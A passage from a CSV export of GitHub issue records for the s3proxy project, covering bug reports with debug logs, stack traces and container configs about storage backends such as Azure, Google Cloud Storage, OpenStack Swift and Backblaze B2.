DEBUG: Sending request method_string='GET', uri='/backup/?delimiter=%2F&prefix=data%2Fbackup%2Fsnapshots%2F', headers={'x-amz-date': '20200820T191251Z', 'Authorization': 'AWS4-HMAC-SHA256 Credential=none/20200820/us-east-1/s3/aws4_request,SignedHeaders=host;x-amz-content-sha256;x-amz-date,Signature=53e4e909916546be4527f62475fcbb2ace0778ded959864eb05f1a7a512aecf4', 'x-amz-content-sha256': 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'}, body=(0 bytes)
DEBUG: ConnMan.put(): connection put back to pool (http://localhost:8080#2)
DEBUG: Response:
{'data': b'<?xml version=\'1.0\' encoding=\'UTF-8\'?><ListBucketResult xmlns=""h'
         b'ttp://s3.amazonaws.com/doc/2006-03-01/""><Name>backup</Name><Prefi'
         b'x>data/backup/snapshots/</Prefix><MaxKeys>1000</MaxKeys><Marker/>'
         b'<Delimiter>/</Delimiter><IsTruncated>true</IsTruncated><NextMarker>2'
         b'!160!MDAwMDc1IWRhdGEvZmRiYmFja3VwL3NuYXBzaG90cy9zbmFwc2hvdCw2NjM2ODY'
         b'xNDQzNzAzLDY3MjMyOTExNzcxNjksNDYzMTM0MTYzNDYyOCEwMDAwMjghMTYwMS0wMS0'
         b'wMVQwMDowMDowMC4wMDAwMDAwWiE-</NextMarker></ListBucketResult>',
 'headers': {'content-type': 'application/xml; charset=UTF-8',
             'date': 'Thu, 20 Aug 2020 19:12:51 GMT',
             'server': 'Jetty(9.2.z-SNAPSHOT)',
             'transfer-encoding': 'chunked',
             'x-amz-request-id': '4442587FB7D0A2F9'},
 'reason': 'OK',
 'status': 200}

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    An unexpected error has occurred.
  Please try reproducing the error using
  the latest s3cmd code from the git master
  branch found at:
    https://github.com/s3tools/s3cmd
  and have a look at the known issues list:
    https://github.com/s3tools/s3cmd/wiki/Common-known-issues-and-their-solutions
  If the error persists, please report the
  following lines (removing any private
  info as necessary) to:
   s3tools-bugs@lists.sourceforge.net


!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

Invoked as: /usr/local/bin/s3cmd -c s3cfg --no-ssl --debug ls s3://backup/data/backup/snapshots/
Problem: <class 'IndexError: list index out of range
S3cmd:   2.1.0
python:   3.8.5 (default, Jul 21 2020, 10:48:26)
[Clang 11.0.3 (clang-1103.0.32.62)]
environment LANG=cs_CZ.UTF-8

Traceback (most recent call last):
  File ""/usr/local/bin/s3cmd"", line 3121, in <module>
    rc = main()
  File ""/usr/local/bin/s3cmd"", line 3030, in main
    rc = cmd_func(args)
  File ""/usr/local/bin/s3cmd"", line 152, in cmd_ls
    subcmd_bucket_list(s3, uri, cfg.limit)
  File ""/usr/local/bin/s3cmd"", line 188, in subcmd_bucket_list
    response = s3.bucket_list(bucket, prefix = prefix, limit = limit)
  File ""/usr/local/Cellar/s3cmd/2.1.0/libexec/lib/python3.8/site-packages/S3/S3.py"", line 321, in bucket_list
    for truncated, dirs, objects in self.bucket_list_streaming(bucket, prefix, recursive, uri_params, limit):
  File ""/usr/local/Cellar/s3cmd/2.1.0/libexec/lib/python3.8/site-packages/S3/S3.py"", line 368, in bucket_list_streaming
    uri_params['marker'] = current_prefixes[-1][""Prefix""]
IndexError: list index out of range
```

_Originally posted by @petr-tichy in https://github.com/gaul/s3proxy/issues/326#issuecomment-677878461_",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/329/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/329/comments,https://api.github.com/repos/gaul/s3proxy/issues/329/events,https://github.com/gaul/s3proxy/issues/329,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/328,679378875,MDU6SXNzdWU2NzkzNzg4NzU=,328,Cannot use s3proxy container with google cloud storage,53399,closed,FALSE,NA,NA,9,2020-08-14T20:11:39Z,2020-08-25T09:12:19Z,2020-08-21T01:14:22Z,NONE,NA,"I'm trying to deploy s3proxy into a kubernetes cluster in gcloud with a google cloud storage provider. However following the s3proxy documentation does not seem to work.

I tried configuring s3proxy as so:
```yaml
containers:
- name: backup-s3proxy
  image: 'andrewgaul/s3proxy:latest'
  env:
  - name: S3PROXY_AUTHORIZATION
    value: none
  - name: JCLOUDS_ENDPOINT
    value: ""https://storage.googleapis.com""
  - name: JCLOUDS_PROVIDER
    value: ""google-cloud-storage""
  - name: JCLOUDS_IDENTITY
    valueFrom:
      secretKeyRef:
        name: gcp-backup-sa
        key: identity
  - name: JCLOUDS_CREDENTIAL
    value: ""/opt/credential-secret/credentials.key""
  volumeMounts:
  - name: credential
    mountPath: ""/opt/credential-secret""
    readOnly: true
volumes:
- name: credential
  secret:
    secretName: gcp-backup-sa
    items:
    - key: credential
      path: credentials.key
```
*(boilerplate and service left out)*

And tested in the cluster:
```shell
kubectl run --restart=Never --rm -it test-curl --image appropriate/curl -- -i 'http://backup-s3proxy.default.svc.cluster.local/cloud-backups'
```

However s3proxy fails with the following error:
```html
<h2>HTTP ERROR: 400</h2>
<p>Problem accessing /cloud-backups. Reason:
<pre>    chars /opt/credential-secret/credentials.key doesn&apos;t contain % line [-----BEGIN ]</pre></p>
<hr /><i><small>Powered by Jetty://</small></i>
```

I shelled into the container and confirmed that `/opt/credential-secret/credentials.key` does in fact contain the key and starts with the expected `-----BEGIN `.

The `chars ... doesn't contain line` did make me try ignoring the documentation and passing the key directly:

```yaml
containers:
- name: backup-s3proxy
  image: 'andrewgaul/s3proxy:latest'
  env:
  - name: S3PROXY_AUTHORIZATION
    value: none
  - name: JCLOUDS_ENDPOINT
    value: ""https://storage.googleapis.com""
  - name: JCLOUDS_PROVIDER
    value: ""google-cloud-storage""
  - name: JCLOUDS_IDENTITY
    valueFrom:
      secretKeyRef:
        name: gcp-backup-sa
        key: identity
  - name: JCLOUDS_CREDENTIAL
    valueFrom:
      secretKeyRef:
        name: gcp-backup-sa
        key: credential
```

But in that case the s3proxy container fails startup with the error `Error: Could not find or load main class RSA`. Possibly related to the fact that the start script doesn't appear to quote the line where `JCLOUDS_CREDENTIAL` is passed on.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/328/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/328/comments,https://api.github.com/repos/gaul/s3proxy/issues/328/events,https://github.com/gaul/s3proxy/issues/328,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/327,669422104,MDU6SXNzdWU2Njk0MjIxMDQ=,327,s3proxy don't accept x-amz-te header,61355916,closed,FALSE,NA,NA,4,2020-07-31T05:15:58Z,2020-08-01T09:52:14Z,2020-07-31T12:50:43Z,NONE,NA,"I'm using awssdk s3client (https://mvnrepository.com/artifact/software.amazon.awssdk/s3) and call getObject() method to get an object on s3proxy, but status code 501 is returned because s3proxy denies x-amz-te header which s3client automatically add.

s3proxy's log (with -DLOG_LEVEL=debug) is following:


> [s3proxy] D 07-29 06:18:10.155 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:287 |::] request: Request(GET /somebucket/somefile.txt)@16a79473
> [s3proxy] D 07-29 06:18:10.155 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:312 |::] header: Authorization: AWS4-HMAC-SHA256 Credential=access_key/20200729/ap-northeast-1/s3/aws4_request, SignedHeaders=amz-sdk-invocation-id;amz-sdk-retry;host;x-amz-content-sha256;x-amz-date;x-amz-te, Signature=6d547b2ffbd61b017ee70510e42b040b5e69d2273e305e2608fdbb5cc9be8002
> [s3proxy] D 07-29 06:18:10.155 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:312 |::] header: x-amz-content-sha256: UNSIGNED-PAYLOAD
> [s3proxy] D 07-29 06:18:10.155 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:312 |::] header: X-Amz-Date: 20200729T061810Z
> [s3proxy] D 07-29 06:18:10.155 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:312 |::] header: x-amz-te: append-md5
> [s3proxy] D 07-29 06:18:10.156 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:312 |::] header: User-Agent: aws-sdk-java/2.10.65 Linux/3.10.0-1062.12.1.el7.x86_64 OpenJDK_64-Bit_Server_VM/11.0.5+10 Java/11.0.5 vendor/Oracle_Corporation io/sync http/Apache
> [s3proxy] D 07-29 06:18:10.156 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:312 |::] header: Connection: Keep-Alive
> [s3proxy] D 07-29 06:18:10.156 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:312 |::] header: Host: s3proxy-internal
> [s3proxy] D 07-29 06:18:10.156 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:312 |::] header: amz-sdk-invocation-id: fb3cd79c-2993-b30d-d95b-7190263c329b
> [s3proxy] D 07-29 06:18:10.156 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:312 |::] header: amz-sdk-retry: 0/0/500
> [s3proxy] E 07-29 06:18:10.156 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:622 |::] Unknown header x-amz-te with URI /somebucke/somefile.txt
> [s3proxy] D 07-29 06:18:10.156 S3Proxy-Jetty-20 o.gaul.s3proxy.S3ProxyHandler:2862 |::] sendSimpleErrorResponse: 501 NotImplemented A header you provided implies functionality that is not implemented. {}


S3ProxyHandler seems to restrict request headers starting with x-amz- .
",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/327/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/327/comments,https://api.github.com/repos/gaul/s3proxy/issues/327/events,https://github.com/gaul/s3proxy/issues/327,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/326,658563680,MDU6SXNzdWU2NTg1NjM2ODA=,326,Azure storage returns empty <Blobs>,4990017,closed,FALSE,NA,NA,1,2020-07-16T20:57:03Z,2020-08-20T20:10:28Z,2020-07-17T10:09:19Z,NONE,NA,"We have hit (a possibly undocumented) behavior of Azure [List Blobs](https://docs.microsoft.com/en-us/rest/api/storageservices/list-blobs) operation returning empty <Blobs> node:

```xml
<?xml version=""1.0"" encoding=""utf-8""?>
<EnumerationResults ServiceEndpoint=""https://myaccount.blob.core.windows.net/"" ContainerName=""mycontainer""> <Marker>2!212!MDAwMTE1IWRhdGEvZmRiYmFja3VwL2t2cmFuZ2VzL3NuYXBzaG90LjAwMDAwNjYyMjQxNDYyNTg5Mi8xNS9yYW5nZSw2NjIzMDE4MTQ4MjUzLGVmNTIyNmU3NDZmZTQ5MWExOTZhNjE5YTA0YmM2MmJjLDEwNDg1NzYhMDAwMDI4ITk5OTktMTItMzFUMjM6NTk6NTkuOTk5OTk5OVoh</Marker>
 <MaxResults>1000</MaxResults>
 <Delimiter>/</Delimiter>
 <Blobs />
<NextMarker>2!212!MDAwMTE0IWRhdGEvZmRiYmFja3VwL2t2cmFuZ2VzL3NuYXBzaG90LjAwMDAwNjYyNDk3Mjg5MTI4Ny80L3JhbmdlLDY2MjUzNjM5MjY4MzMsMjgxNzgxOTI4ZGJkMjRhN2FmZTNiNTJkZTFhZjFkOGUsMTA0ODU3NiEwMDAwMjghOTk5OS0xMi0zMVQyMzo1OTo1OS45OTk5OTk5WiE-</NextMarker>
</EnumerationResults>"" 
```

This causes 
```
java.util.NoSuchElementException: null
	at java.base/java.util.LinkedHashMap$LinkedHashIterator.nextNode(LinkedHashMap.java:760)
	at java.base/java.util.LinkedHashMap$LinkedKeyIterator.next(LinkedHashMap.java:780)
	at com.google.common.collect.Iterators.getLast(Iterators.java:876)
	at com.google.common.collect.Iterables.getLast(Iterables.java:794)
	at org.gaul.s3proxy.S3ProxyHandler.handleBlobList(S3ProxyHandler.java:1464)
	at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:672)
	at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:76)
	at org.gaul.shaded.org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:97)
```

Comparing with debug output of `az storage blob list`, it seems this is OK and azure-cli simply issues a next request.

Thanks

Petr",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/326/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/326/comments,https://api.github.com/repos/gaul/s3proxy/issues/326/events,https://github.com/gaul/s3proxy/issues/326,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/325,651991434,MDU6SXNzdWU2NTE5OTE0MzQ=,325,Sharding middleware,848247,open,FALSE,NA,NA,0,2020-07-07T04:36:31Z,2020-07-07T04:36:31Z,NA,OWNER,NA,"Some S3 implementations have hotspots if key names distribute poorly, e.g., date and timestamp prefixes:

https://aws.amazon.com/blogs/aws/amazon-s3-performance-tips-tricks-seattle-hiring-event/

S3Proxy could support a middleware which adds a prefix of the key name hash to the key name.  This poses challenges for listing objects but this operation could either be disabled or return the prefixed name instead of the user-provided name.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/325/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/325/comments,https://api.github.com/repos/gaul/s3proxy/issues/325/events,https://github.com/gaul/s3proxy/issues/325,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/324,644263183,MDU6SXNzdWU2NDQyNjMxODM=,324,Minimum part size for transient and filesystem blobstore is 1 byte,848247,closed,FALSE,NA,NA,0,2020-06-24T02:09:33Z,2020-06-24T14:01:19Z,2020-06-24T14:01:19Z,OWNER,NA,S3Proxy uses the minimum blob size for each storage backend since some are (were?) greater than S3's 5 MB size.  For the transient and filesystem blobstores this is 1 which is not useful for emulating S3.  Make this 5 MB by default and possibly allow overriding it.  References s3fs-fuse/s3fs-fuse#1313.  @ggtakec,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/324/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/324/comments,https://api.github.com/repos/gaul/s3proxy/issues/324/events,https://github.com/gaul/s3proxy/issues/324,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/323,612785308,MDU6SXNzdWU2MTI3ODUzMDg=,323,openstack-swift with OVH returns 401 Unauthorized,1025560,open,FALSE,NA,NA,1,2020-05-05T17:52:26Z,2021-03-08T11:30:41Z,NA,NONE,NA,"I'm using a swift bucket on OVH

The CLI tool `swift -A $OS_AUTH_URL -U $OS_USERNAME -K $OS_PASSWORD list -l foto-condivise` works smoothly.

My config is:

```yml
  s3proxy:
    image: andrewgaul/s3proxy
    ports:
    - 127.0.0.1:8084:80
    environment:
      S3PROXY_AUTHORIZATIONs: none
      JCLOUDS_PROVIDER: openstack-swift
      JCLOUDS_ENDPOINT: $OS_AUTH_URL
      JCLOUDS_REGION: $OS_REGION_NAME
      JCLOUDS_REGIONS: $OS_REGION_NAME
      #JCLOUDS_IDENTITY: $OS_TENANT_NAME:$OS_USERNAME
      JCLOUDS_IDENTITY: $OS_TENANT_ID:OS_USERNAME
      JCLOUDS_CREDENTIAL: $OS_PASSWORD
      JCLOUDS_KEYSTONE_VERSION: $OS_IDENTITY_API_VERSION
      JCLOUDS_KEYSTONE_SCOPE: project:Default
      JCLOUDS_KEYSTONE_PROJECT_DOMAIN_NAME: Default
```

(I've tried both versions of `JCLOUDS_IDENTITY`) the log states:

```
s3proxy_1    | [s3proxy] E 05-05 17:50:08.975 main org.gaul.s3proxy.Main:238 |::] Exception in thread ""main"" 
s3proxy_1    | [s3proxy] E 05-05 17:50:08.979 main org.gaul.s3proxy.Main:238 |::] org.jclouds.rest.AuthorizationException: request: POST https://auth.cloud.ovh.net/v3/auth/tokens HTTP/1.1  [Sensitive data in payload, use jclouds.wire.log.sensitive override to enable logging this data.] failed with response: HTTP/1.1 401 Unauthorized
s3proxy_1    | [s3proxy] E 05-05 17:50:08.979 main org.gaul.s3proxy.Main:238 |::] 	at org.jclouds.openstack.swift.v1.handlers.SwiftErrorHandler.handleError(SwiftErrorHandler.java:51)
s3proxy_1    | [s3proxy] E 05-05 17:50:08.980 main org.gaul.s3proxy.Main:238 |::] 	at org.jclouds.http.handlers.DelegatingErrorHandler.handleError(DelegatingErrorHandler.java:65)
s3proxy_1    | [s3proxy] E 05-05 17:50:08.980 main org.gaul.s3proxy.Main:238 |::] 	at org.jclouds.http.internal.BaseHttpCommandExecutorService.shouldContinue(BaseHttpCommandExecutorService.java:138)
s3proxy_1    | [s3proxy] E 05-05 17:50:08.980 main org.gaul.s3proxy.Main:238 |::] 	at org.jclouds.http.internal.BaseHttpCommandExecutorService.invoke(BaseHttpCommandExecutorService.java:107)
s3proxy_1    | [s3proxy] E 05-05 17:50:08.980 main org.gaul.s3proxy.Main:238 |::] 	at org.jclouds.rest.internal.InvokeHttpMethod.invoke(InvokeHttpMethod.java:91)
s3proxy_1    | [s3proxy] E 05-05 17:50:08.980 main org.gaul.s3proxy.Main:238 |::] 	at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:74)
s3proxy_1    | [s3proxy] E 05-05 17:50:08.980 main org.gaul.s3proxy.Main:238 |::] 	at org.jclouds.rest.internal.InvokeHttpMethod.apply(InvokeHttpMethod.java:45)
s3proxy_1    | [s3proxy] E 05-05 17:50:08.980 main org.gaul.s3proxy.Main:238 |::] 	at org.jclouds.rest.internal.DelegatesToInvocationFunction.handle(DelegatesToInvocationFunction.java:156)
s3proxy_1    | [s3proxy] E 05-05 17:50:08.980 main org.gaul.s3proxy.Main:238 |::] 	at org.jclouds.rest.internal.DelegatesToInvocationFunction.invoke(DelegatesToInvocationFunction.java:123)
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/323/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/323/comments,https://api.github.com/repos/gaul/s3proxy/issues/323/events,https://github.com/gaul/s3proxy/issues/323,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/322,601779109,MDExOlB1bGxSZXF1ZXN0NDA0OTgxMTE5,322,Use original uri to compute canonical_request in s3v4 signature,6404013,closed,FALSE,NA,NA,2,2020-04-17T07:57:20Z,2020-04-25T14:00:27Z,2020-04-25T03:57:28Z,CONTRIBUTOR,NA,"Currently canonical_request is based on a canonical_uri for which bucket name is prepend
if dns path style is used which is not compatible with s3v4 signature mechanism

Closes #321 ",NA,TRUE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/322/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/322/comments,https://api.github.com/repos/gaul/s3proxy/issues/322/events,https://github.com/gaul/s3proxy/pull/322,https://api.github.com/repos/gaul/s3proxy/pulls/322
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/321,601775007,MDU6SXNzdWU2MDE3NzUwMDc=,321,s3v4 signature matching with DNS style path leads to SignatureDoesNotMatch,6404013,closed,FALSE,NA,NA,0,2020-04-17T07:49:50Z,2020-04-25T03:57:28Z,2020-04-25T03:57:28Z,CONTRIBUTOR,NA,"The canonical_uri used to compute the canonical_request is based uri containing the `bucket + uri` which is fine for s3v2 but not for s3v4.
In s3v4 it should only be the uri.
Due to that the signature computed by `S3ProxyHandler` never match to the ones computed by python library botocore o by the java aws one

Here is the canonical_uri computed by botocore:
```
 PUT
/Nico3

content-md5:rMyRBd9TgxEUB/1bQSVeIw==
host:nico-test-video.localhost:31853
x-amz-content-sha256:0e07cf830957701d43c183f1515f63e6b68027e528f43ef52b1527a520dddbbbb
x-amz-date:20200416T150120Z

content-md5;host;x-amz-content-sha256;x-amz-date
0e07cf830957701d43c183f1515f63e6b68027e528f43ef52b1527a520ddbbbb
```

And by s3Poxy
```
 PUT
/nico-test-video/Nico3

content-md5:rMyRBd9TgxEUB/1bQSVeIw==
host:nico-test-video.localhost:31853
x-amz-content-sha256:0e07cf830957701d43c183f1515f63e6b68027e528f43ef52b1527a520ddbbbb
x-amz-date:20200416T151543Z

content-md5;host;x-amz-content-sha256;x-amz-date
0e07cf830957701d43c183f1515f63e6b68027e528f43ef52b1527a520ddbbbb
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/321/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/321/comments,https://api.github.com/repos/gaul/s3proxy/issues/321/events,https://github.com/gaul/s3proxy/issues/321,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/320,570601738,MDU6SXNzdWU1NzA2MDE3Mzg=,320,MultiPartUpload response content type,1811765,closed,FALSE,NA,NA,5,2020-02-25T14:17:01Z,2020-07-16T09:39:03Z,2020-07-16T09:39:02Z,NONE,NA,"Hello, 
version 1.7.0 has the same error as here (version 1.6.1 doesn't have)
https://github.com/adobe/S3Mock/issues/35
https://github.com/adobe/S3Mock/issues/210

> 2020-02-25 16:08:50.149 WARN  HttpChannel - /input_9c2Ex/bucketKey.json?uploadId=323aaab8-c622-4489-befe-1dc260385bc7 [S3Proxy-Jetty-29|]
java.lang.NullPointerException: null
        at com.google.common.base.Preconditions.checkNotNull(Preconditions.java:882)
        at com.google.common.io.BaseEncoding$StandardBaseEncoding.trimTrailingPadding(BaseEncoding.java:676)
        at com.google.common.io.BaseEncoding.decodeChecked(BaseEncoding.java:231)
        at com.google.common.io.BaseEncoding.decode(BaseEncoding.java:217)
        at org.jclouds.blobstore.config.LocalBlobStore.completeMultipartUpload(LocalBlobStore.java:843)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37)
        at com.sun.proxy.$Proxy47.completeMultipartUpload(Unknown Source)
        at org.gaul.s3proxy.S3ProxyHandler$3.run(S3ProxyHandler.java:2288)
2020-02-25 16:08:50.149 WARN  HttpChannel - Could not send response error 500: java.lang.NullPointerException [S3Proxy-Jetty-29|]
[info] HistorySpec *** ABORTED ***
[info]   org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.
[info]   at com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper.createSAXParseException(ErrorHandlerWrapper.java:203)
[info]   at com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper.fatalError(ErrorHandlerWrapper.java:177)
[info]   at com.sun.org.apache.xerces.internal.impl.XMLErrorReporter.reportError(XMLErrorReporter.java:400)
[info]   at com.sun.org.apache.xerces.internal.impl.XMLErrorReporter.reportError(XMLErrorReporter.java:327)
[info]   at com.sun.org.apache.xerces.internal.impl.XMLScanner.reportFatalError(XMLScanner.java:1472)
[info]   at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.endEntity(XMLDocumentFragmentScannerImpl.java:899)
[info]   at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.endEntity(XMLDocumentScannerImpl.java:559)
[info]   at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.endEntity(XMLEntityManager.java:1398)
[info]   at com.sun.org.apache.xerces.internal.impl.XMLEntityScanner.load(XMLEntityScanner.java:1916)
[info]   at com.sun.org.apache.xerces.internal.impl.XMLEntityScanner.skipSpaces(XMLEntityScanner.java:1655)
[info]   ...",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/320/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/320/comments,https://api.github.com/repos/gaul/s3proxy/issues/320/events,https://github.com/gaul/s3proxy/issues/320,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/319,538542248,MDU6SXNzdWU1Mzg1NDIyNDg=,319,S3ProxyRule HTTPS Support,40227067,closed,FALSE,NA,NA,2,2019-12-16T17:11:52Z,2019-12-17T11:07:04Z,2019-12-17T11:06:06Z,NONE,NA,Can S3ProxyRule be launched as HTTPS?,NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/319/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/319/comments,https://api.github.com/repos/gaul/s3proxy/issues/319/events,https://github.com/gaul/s3proxy/issues/319,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/318,519617855,MDU6SXNzdWU1MTk2MTc4NTU=,318,NullPointerException with filesystem backend,1772540,closed,FALSE,NA,NA,4,2019-11-08T02:12:49Z,2020-05-16T02:17:53Z,2019-11-09T03:11:34Z,COLLABORATOR,NA,"step to reproduce:
1. change goofys's s3proxy backend to filesystem
2. make s3proxy.jar
3. ./test/run-tests.sh TestBenchCreate$

```
[s3proxy] W 11-08 02:02:19.424 S3Proxy-Jetty-126 o.g.s.o.e.j.server.HttpChannel:396 |::] /goofys-test-3q1bahr7ennp0x6c/test_dir/file3/
java.lang.NullPointerException: null
        at org.jclouds.blobstore.config.LocalBlobStore.getBlob(LocalBlobStore.java:644)
        at org.jclouds.blobstore.config.LocalBlobStore.getBlob(LocalBlobStore.java:201)
        at org.jclouds.blobstore.config.LocalBlobStore.blobMetadata(LocalBlobStore.java:736)
        at sun.reflect.GeneratedMethodAccessor9.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at com.google.inject.internal.DelegatingInvocationHandler.invoke(DelegatingInvocationHandler.java:37)
        at com.sun.proxy.$Proxy40.blobMetadata(Unknown Source)
        at org.gaul.s3proxy.S3ProxyHandler.handleBlobMetadata(S3ProxyHandler.java:1572)
        at org.gaul.s3proxy.S3ProxyHandler.doHandle(S3ProxyHandler.java:688)
        at org.gaul.s3proxy.S3ProxyHandlerJetty.handle(S3ProxyHandlerJetty.java:76)
```",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/318/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/318/comments,https://api.github.com/repos/gaul/s3proxy/issues/318/events,https://github.com/gaul/s3proxy/issues/318,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/317,513421700,MDU6SXNzdWU1MTM0MjE3MDA=,317,Backblaze B2 sha1 checksum,8253183,open,FALSE,NA,NA,3,2019-10-28T16:39:16Z,2019-10-29T00:21:04Z,NA,NONE,NA,"**System:**
CentOS Linux release 7.7.1908 (Core)
s3fs version 1.85 pulled from CentOS epel repo.
java-1.8.0-openjdk-1.8.0.232.b09-0.el7_7

Is there a way to use the sha1 checksum functionality of the B2 api using s3fs on top of s3proxy?

I have done a little research and testing but I haven't seem to come up with a way. 

This is one of those S3 to B2 quirks that is probably hard to translate.",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/317/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/317/comments,https://api.github.com/repos/gaul/s3proxy/issues/317/events,https://github.com/gaul/s3proxy/issues/317,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/316,513378655,MDU6SXNzdWU1MTMzNzg2NTU=,316,Backblaze B2 directory creation,8253183,open,FALSE,NA,NA,1,2019-10-28T15:28:31Z,2021-04-25T13:45:05Z,NA,NONE,NA,"**System:**
CentOS Linux release 7.7.1908 (Core)
s3fs version 1.85 pulled from CentOS epel repo.
java-1.8.0-openjdk-1.8.0.232.b09-0.el7_7

I am using s3fs on top of s3proxy. My s3proxy is connected to Backblaze B2.

When trying to do a mkdir I get an Input/output error.

>curl.cpp:RequestPerform(2248): HTTP response code 400, returning EIO. Body Text:
><html>
><head>
><meta http-equiv=""Content-Type"" content=""text/html;charset=ISO-8859-1""/>
><title>Error 400 </title>
></head>
><body>
><h2>HTTP ERROR: 400</h2>
><p>Problem accessing /**BUCKET**/test/. Reason:
><pre>    File names must not end with &apos;/&apos;</pre></p>
><hr /><i><small>Powered by Jetty://</small></i>
></body>
></html>

Upon further research, this is a B2 api thing. Reference https://www.backblaze.com/blog/how-to-code-backblaze-b2-api-interface/

> Directory Objects don’t exist: Unlike Amazon, where an object with that ends with a “/” is considered a directory, this does not port to B2. There is an undocumented object name that B2 applications use called .bzEmpty. Numerous 3rd party applications, including BridgeSTOR, treat an object ending with .bzEmpty as a directory name. This is also important for directory listings described above. If you choose to use this method, you will be required to replace the “.bzEmpty” with a “/.”

I'm not sure if this is a s3proxy issue or a JClouds  issue but it would be nice to be able to get it resolved.

The workaround I use is to create the directory structure using the B2 ""Browse Files"" feature on your account and then creating directories in the bucket from there.


",NA,FALSE,https://api.github.com/repos/gaul/s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/316/labels{/name},https://api.github.com/repos/gaul/s3proxy/issues/316/comments,https://api.github.com/repos/gaul/s3proxy/issues/316/events,https://github.com/gaul/s3proxy/issues/316,NA
gaul,s3proxy,https://api.github.com/repos/gaul/s3proxy/issues/315,510204034,MDU6SXNzdWU1MTAyMDQwMzQ=,315,Support overriding host for pre-signed URLs,848247,open,FALSE,NA,NA,3,2019-10-21T18:50:03Z,2020-07-22T20:22:42Z,NA,OWNER,NA,"From Twitter:

> Is it possible to tell @S3Proxy in a docker, that it should use the IP of the host instead of 127.0.0.1 for presigned urls. Whatever I tried I always get the localhost IP and thereby can not use it from another machine on the network. Apprechiate your help!

